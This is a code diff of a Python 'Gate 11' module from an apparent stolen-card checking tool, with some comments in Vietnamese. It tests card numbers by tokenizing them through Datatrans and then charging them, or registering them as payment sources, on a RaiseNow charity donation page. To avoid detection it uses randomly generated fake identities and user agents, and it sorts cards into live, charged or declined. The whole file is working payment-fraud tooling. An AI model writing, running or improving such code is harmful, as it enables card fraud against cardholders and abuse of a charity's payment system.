@@ -3,41 +3,49 @@ import string
 import json
 import logging
 import time
+from concurrent.futures import ThreadPoolExecutor, as_completed
 
-# List of country codes for random selection
-COUNTRY_CODES = [
-    'CH', 'DE', 'AT', 'IT', 'FR', 'AF', 'AL', 'DZ', 'AS', 'AD', 'AO', 'AI', 'AQ', 'AG', 'AR', 'AM', 'AW', 'AZ', 'AU', 'BS', 
-    'BH', 'BD', 'BB', 'BY', 'BE', 'BZ', 'BJ', 'BM', 'BT', 'BO', 'BA', 'BW', 'BV', 'BR', 'IO', 'BG', 'BF', 'BI', 'CL', 'CN', 
-    'CO', 'CK', 'CR', 'DJ', 'DM', 'DO', 'DK', 'SV', 'CI', 'EC', 'ER', 'EE', 'FK', 'FJ', 'FI', 'TF', 'GF', 'PF', 'FO', 'GA', 
-    'GM', 'GE', 'GH', 'GI', 'GD', 'GR', 'GB', 'GL', 'GP', 'GU', 'GT', 'GG', 'GN', 'GW', 'GY', 'HT', 'HM', 'HN', 'HK', 'IN', 
-    'ID', 'IM', 'IQ', 'IR', 'IE', 'IS', 'IL', 'JM', 'JP', 'JE', 'JO', 'VG', 'VI', 'KY', 'KH', 'CM', 'CA', 'CV', 'KZ', 'QA', 
-    'KE', 'KG', 'KI', 'CC', 'KM', 'CG', 'CD', 'XK', 'HR', 'CU', 'KW', 'LA', 'LS', 'LV', 'LB', 'LR', 'LI', 'LT', 'LU', 'LY', 
-    'MO', 'MG', 'MW', 'MY', 'MV', 'ML', 'MT', 'MA', 'MH', 'MQ', 'MR', 'MU', 'YT', 'MK', 'MX', 'FM', 'MD', 'MC', 'MN', 'ME', 
-    'MS', 'MZ', 'MM', 'NA', 'NR', 'NP', 'NC', 'NZ', 'NI', 'NL', 'NE', 'NG', 'NU', 'KP', 'MP', 'NF', 'NO', 'OM', 'PK', 'PW', 
-    'PS', 'PA', 'PG', 'PY', 'PE', 'PH', 'PN', 'PL', 'PT', 'PR', 'RW', 'RO', 'RU', 'RE', 'KN', 'MF', 'SB', 'ZM', 'WS', 'SM', 
-    'BL', 'SA', 'SE', 'SN', 'RS', 'SC', 'SL', 'ZW', 'SG', 'SK', 'SI', 'SO', 'ES', 'LK', 'SH', 'LC', 'PM', 'VC', 'SD', 'SR', 
-    'SJ', 'SZ', 'SY', 'ST', 'GS', 'ZA', 'KR', 'TJ', 'TW', 'TZ', 'TH', 'TL', 'TG', 'TK', 'TO', 'TT', 'TD', 'CZ', 'TN', 'TM', 
-    'TC', 'TV', 'TR', 'UG', 'UA', 'HU', 'UY', 'UZ', 'VU', 'VA', 'VE', 'AE', 'US', 'VN', 'WF', 'CX', 'BN', 'EH', 'YE', 'CF', 
-    'CY', 'EG', 'GQ', 'ET', 'AX', 'UM', 'BQ', 'CW', 'SS', 'SX'
-]
-
+# Lấy logger để ghi lại các lỗi nếu cần
 logger = logging.getLogger(__name__)
 
-# --- HELPER FUNCTIONS FOR RANDOM DATA (SELF-CONTAINED) ---
+# --- NEW: DANH SÁCH MÃ QUỐC GIA CHO GATE 11 ---
+COUNTRY_CODES = [
+    "CH", "DE", "AT", "IT", "FR", "AF", "AL", "DZ", "AS", "AD", "AO", "AI", "AQ",
+    "AG", "AR", "AM", "AW", "AZ", "AU", "BS", "BH", "BD", "BB", "BY", "BE", "BZ",
+    "BJ", "BM", "BT", "BO", "BA", "BW", "BV", "BR", "IO", "BG", "BF", "BI", "CL",
+    "CN", "CO", "CK", "CR", "DJ", "DM", "DO", "DK", "SV", "CI", "EC", "ER", "EE",
+    "FK", "FJ", "FI", "TF", "GF", "PF", "FO", "GA", "GM", "GE", "GH", "GI", "GD",
+    "GR", "GB", "GL", "GP", "GU", "GT", "GG", "GN", "GW", "GY", "HT", "HM", "HN",
+    "HK", "IN", "ID", "IM", "IQ", "IR", "IE", "IS", "IL", "JM", "JP", "JE", "JO",
+    "VG", "VI", "KY", "KH", "CM", "CA", "CV", "KZ", "QA", "KE", "KG", "KI", "CC",
+    "KM", "CG", "CD", "XK", "HR", "CU", "KW", "LA", "LS", "LV", "LB", "LR", "LI",
+    "LT", "LU", "LY", "MO", "MG", "MW", "MY", "MV", "ML", "MT", "MA", "MH", "MQ",
+    "MR", "MU", "YT", "MK", "MX", "FM", "MD", "MC", "MN", "ME", "MS", "MZ", "MM",
+    "NA", "NR", "NP", "NC", "NZ", "NI", "NL", "NE", "NG", "NU", "KP", "MP", "NF",
+    "NO", "OM", "PK", "PW", "PS", "PA", "PG", "PY", "PE", "PH", "PN", "PL", "PT",
+    "PR", "RW", "RO", "RU", "RE", "KN", "MF", "SB", "ZM", "WS", "SM", "BL", "SA",
+    "SE", "SN", "RS", "SC", "SL", "ZW", "SG", "SK", "SI", "SO", "ES", "LK", "SH",
+    "LC", "PM", "VC", "SD", "SR", "SJ", "SZ", "SY", "ST", "GS", "ZA", "KR", "TJ",
+    "TW", "TZ", "TH", "TL", "TG", "TK", "TO", "TT", "TD", "CZ", "TN", "TM", "TC",
+    "TV", "TR", "UG", "UA", "HU", "UY", "UZ", "VU", "VA", "VE", "AE", "US", "VN",
+    "WF", "CX", "BN", "EH", "YE", "CF", "CY", "EG", "GQ", "ET", "AX", "UM", "BQ",
+    "CW", "SS", "SX"
+]
 
+# --- CÁC HÀM HỖ TRỢ RANDOM (Tương tự Gate 1) ---
 def generate_random_string(length=8):
-    """Generates a random string of characters."""
+    """Tạo một chuỗi ký tự ngẫu nhiên."""
     letters = string.ascii_lowercase
     return ''.join(random.choice(letters) for _ in range(length))
 
 def random_email():
-    """Generates a random email address."""
+    """Tạo một địa chỉ email ngẫu nhiên."""
     prefix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(8, 15)))
     domain = ''.join(random.choices(string.ascii_lowercase, k=random.randint(5, 10)))
     return f"{prefix}@{domain}.com"
 
 def random_user_agent():
-    """Generates a random realistic User-Agent string."""
+    """Tạo một chuỗi User-Agent thực tế ngẫu nhiên."""
     chrome_major = random.randint(100, 125)
     chrome_build = random.randint(0, 6500)
     chrome_patch = random.randint(0, 250)
@@ -56,13 +64,12 @@ def random_user_agent():
         f"Chrome/{chrome_version} Safari/{safari_version}"
     )
 
-# Wrapper function for making requests with retry logic, passed from main.py
 def make_request_with_retry(session, method, url, max_retries=5, cancellation_event=None, **kwargs):
+    """Hàm này sao chép từ main.py để đảm bảo tính độc lập của module"""
     last_exception = None
     for attempt in range(max_retries):
         if cancellation_event and cancellation_event.is_set():
             return None, "Operation cancelled by user"
-        
         try:
             response = session.request(method, url, **kwargs)
             return response, None
@@ -70,21 +77,32 @@ def make_request_with_retry(session, method, url, max_retries=5, cancellation_ev
             last_exception = e
             wait_time = attempt + 1
             logger.warning(f"Attempt {attempt + 1}/{max_retries} for {url} failed: {e}. Retrying in {wait_time}s...")
+            if cancellation_event and cancellation_event.is_set(): # Check again after potential sleep
+                return None, "Operation cancelled by user"
             time.sleep(wait_time)
     
     final_error_message = f"Retry: All {max_retries} retry attempts for {url} failed. Last error: {last_exception}"
     logger.error(final_error_message)
     return None, final_error_message
 
-# --- MAIN CHECKER FUNCTION FOR GATE 11 ---
-
-def check_card_gate11(session, line, cc, mes, ano, cvv, bin_info, cancellation_event, get_gate11_mode, _get_charge_value, custom_charge_amount=None):
-    """Logic for Gate 11 - Charge or Live Check Mode V11"""
-    gate11_mode = get_gate11_mode()
-
+# --- HÀM CHECK CHÍNH CHO GATE 11 ---
+def check_card_gate11(session, line, cc, mes, ano, cvv, bin_info, cancellation_event, get_gate11_mode_func, get_charge_value_func, custom_charge_amount=None):
+    """Logic for Gate 11 - Charge or Live Check Mode"""
     try:
+        gate11_mode = get_gate11_mode_func()
         user_agent = random_user_agent()
         
+        # --- Random personal info (Tương tự Gate 1 và yêu cầu mới) ---
+        first_name = generate_random_string(random.randint(10, 15))
+        last_name = generate_random_string(random.randint(10, 15))
+        cardholder = f"{first_name} {last_name}"
+        email = random_email()
+        street = generate_random_string(random.randint(25, 30))
+        postal_code = str(random.randint(10000, 99999))
+        city = generate_random_string(random.randint(20, 25))
+        country = random.choice(COUNTRY_CODES)
+        message_text = generate_random_string(random.randint(10, 30))
+
         # --- Step 1: Tokenize card ---
         tokenize_url = "https://pay.datatrans.com/upp/payment/SecureFields/paymentField"
         tokenize_headers = {
@@ -96,7 +114,7 @@ def check_card_gate11(session, line, cc, mes, ano, cvv, bin_info, cancellation_e
         }
         tokenize_payload = {
             "mode": "TOKENIZE",
-            "formId": "250808040558588645",
+            "formId": "250808040558588645", # formId cho Gate 11
             "cardNumber": cc,
             "cvv": cvv,
             "paymentMethod": "ECA",
@@ -114,35 +132,26 @@ def check_card_gate11(session, line, cc, mes, ano, cvv, bin_info, cancellation_e
         if error: return 'cancelled' if "cancelled" in error else 'error', line, f"Tokenize Error: {error}", bin_info
         if not token_response: return 'error', line, "HTTP Error with no response during Tokenization", bin_info
 
-        # Handle specific decline from tokenization
-        if "Card number not allowed in production" in token_response.text:
-            return 'decline', line, 'CARD_NOT_ALLOWED_DECLINE', bin_info
-
+        # Phân tích phản hồi từ bước Tokenize
         try:
             token_data = token_response.json()
             if "error" in token_data and "message" in token_data.get("error", {}):
-                 return 'decline', line, token_data["error"]["message"], bin_info
+                 # Các lỗi phổ biến từ Datatrans
+                 error_msg = token_data["error"]["message"]
+                 if "Invalid card number" in error_msg: return 'decline', line, 'INVALID_CARDNUMBER_DECLINE', bin_info
+                 return 'decline', line, error_msg, bin_info
+            
             transaction_id = token_data.get("transactionId")
             if not transaction_id:
                 return 'decline', line, token_data.get("error", "Unknown error at Tokenize"), bin_info
         except json.JSONDecodeError:
+            if "Card number not allowed in production" in token_response.text:
+                return 'decline', line, 'CARD_NOT_ALLOWED_DECLINE', bin_info
             if token_response.status_code != 200:
                 return 'error', line, f"HTTP Error {token_response.status_code} during Tokenization", bin_info
             return 'error', line, "Tokenize response was not JSON", bin_info
 
-        # --- Step 2: Make request based on mode ---
-        
-        # Random personal info as requested
-        first_name = generate_random_string(random.randint(10, 15))
-        last_name = generate_random_string(random.randint(10, 15))
-        cardholder = f"{first_name} {last_name}"
-        email = random_email()
-        street = generate_random_string(random.randint(25, 30))
-        postal_code = ''.join(random.choices(string.digits, k=5))
-        city = generate_random_string(random.randint(20, 25))
-        country = random.choice(COUNTRY_CODES)
-        message_text = generate_random_string(random.randint(10, 30))
-
+        # --- Step 2: Make payment/source request based on mode ---
         payment_headers = {
             "Accept": "application/json, text/plain, */*",
             "Content-Type": "application/json",
@@ -151,8 +160,8 @@ def check_card_gate11(session, line, cc, mes, ano, cvv, bin_info, cancellation_e
             "User-Agent": user_agent
         }
         
-        # Base payload structure
-        payment_payload = {
+        # Payload cơ bản cho cả hai chế độ
+        base_payload = {
             "account_uuid": "dc82362f-b3ba-4581-87e8-79f49eda26a9",
             "test_mode": False,
             "create_supporter": False,
@@ -163,7 +172,13 @@ def check_card_gate11(session, line, cc, mes, ano, cvv, bin_info, cancellation_e
                 "last_name": last_name,
                 "email": email,
                 "email_permission": False,
-                "raisenow_parameters": {"integration": {"opt_in": {"email": False}}},
+                "raisenow_parameters": {
+                    "integration": {
+                        "opt_in": {
+                            "email": False
+                        }
+                    }
+                },
                 "street": street,
                 "postal_code": postal_code,
                 "city": city,
@@ -176,11 +191,25 @@ def check_card_gate11(session, line, cc, mes, ano, cvv, bin_info, cancellation_e
                     "suggested_amounts": "[2000,5000,10000]",
                     "user_agent": user_agent
                 },
-                "solution": {"uuid": "c60204c5-2c1b-47a2-ad3a-d852842eae1e", "name": "Page don - Site internet", "type": "donate"},
-                "product": {"name": "tamaro", "source_url": "https://donate.raisenow.io/nptfc?lng=en", "uuid": "self-service", "version": "2.16.0"},
-                "integration": {"message": message_text}
+                "solution": {
+                    "uuid": "c60204c5-2c1b-47a2-ad3a-d852842eae1e",
+                    "name": "Page don - Site internet",
+                    "type": "donate"
+                },
+                "product": {
+                    "name": "tamaro",
+                    "source_url": "https://donate.raisenow.io/nptfc?lng=en",
+                    "uuid": "self-service",
+                    "version": "2.16.0"
+                },
+                "integration": {
+                    "message": message_text
+                }
             },
-            "custom_parameters": {"campaign_id": "Page donation - Website", "campaign_subid": ""},
+            "custom_parameters": {
+                "campaign_id": "Page donation - Website",
+                "campaign_subid": ""
+            },
             "payment_information": {
                 "brand_code": "eca",
                 "cardholder": cardholder,
@@ -192,15 +221,12 @@ def check_card_gate11(session, line, cc, mes, ano, cvv, bin_info, cancellation_e
             "return_url": "https://donate.raisenow.io/nptfc?lng=en&rnw-view=payment_result"
         }
 
-        # --- CHARGE MODE ---
+        # Tùy chỉnh payload dựa trên chế độ
         if gate11_mode == 'charge':
-            charge_value = _get_charge_value('11', custom_charge_amount)
-            payment_url = "https://api.raisenow.io/payments" # Charge endpoint
-            
-            # Update amount for charge
+            charge_value = get_charge_value_func('11', custom_charge_amount)
+            payment_url = "https://api.raisenow.io/payments" # Endpoint charge
+            payment_payload = base_payload.copy()
             payment_payload["amount"] = {"currency": "CHF", "value": charge_value}
-            # The subscription key is not needed for a one-time charge
-            payment_payload.pop("subscription", None)
 
             payment_response, error = make_request_with_retry(session, 'post', payment_url, json=payment_payload, headers=payment_headers, timeout=20, cancellation_event=cancellation_event)
             if error: return 'cancelled' if "cancelled" in error else 'error', line, f"Payment Error: {error}", bin_info
@@ -209,21 +235,16 @@ def check_card_gate11(session, line, cc, mes, ano, cvv, bin_info, cancellation_e
             response_text = payment_response.text
             if '{"message":"Forbidden"}' in response_text: return 'gate_dead', line, 'GATE_DIED: Forbidden', bin_info
             
-            # Key check logic is the same as Gate 1
+            # Logic check key giống hệt Gate 1
             if '"payment_status":"succeeded"' in response_text: return 'success', line, f'CHARGED_{charge_value}', bin_info
             elif '"payment_status":"failed"' in response_text: return 'decline', line, response_text, bin_info
-            elif '"action":{"action_type":"redirect"' in response_text: return 'custom', line, response_text, bin_info
-            elif '"3d_secure_2"' in response_text: return 'custom', line, response_text, bin_info
+            elif '"action":{"action_type":"redirect"' in response_text or '"3d_secure_2"' in response_text: return 'custom', line, response_text, bin_info
             else: return 'unknown', line, response_text, bin_info
         
-        # --- LIVE CHECK MODE ---
-        else: # 'live'
-            payment_url = "https://api.raisenow.io/payment-sources" # Live check endpoint
-            
-            # Amount is still needed for source creation
-            payment_payload["amount"] = {"currency": "CHF", "value": 50}
-            # Add subscription key for live check
-            payment_payload["subscription"] = { "recurring_interval": "6 * *", "timezone": "Asia/Bangkok" }
+        else: # Chế độ 'live'
+            payment_url = "https://api.raisenow.io/payment-sources" # Endpoint check live
+            payment_payload = base_payload.copy()
+            payment_payload["amount"] = {"currency": "CHF", "value": 50} # Giá trị mặc định cho check live
 
             payment_response, error = make_request_with_retry(session, 'post', payment_url, json=payment_payload, headers=payment_headers, timeout=20, cancellation_event=cancellation_event)
             if error: return 'cancelled' if "cancelled" in error else 'error', line, f"Payment Source Error: {error}", bin_info
@@ -231,8 +252,8 @@ def check_card_gate11(session, line, cc, mes, ano, cvv, bin_info, cancellation_e
 
             response_text = payment_response.text
             if '{"message":"Forbidden"}' in response_text: return 'gate_dead', line, 'GATE_DIED: Forbidden', bin_info
-            
-            # Key check logic for live success
+
+            # Logic check key giống hệt Gate 1
             if '"payment_source_status":"pending"' in response_text: return 'live_success', line, response_text, bin_info
             elif '"payment_status":"failed"' in response_text or '"payment_source_status":"failed"' in response_text: return 'decline', line, response_text, bin_info
             else: return 'unknown', line, response_text, bin_info
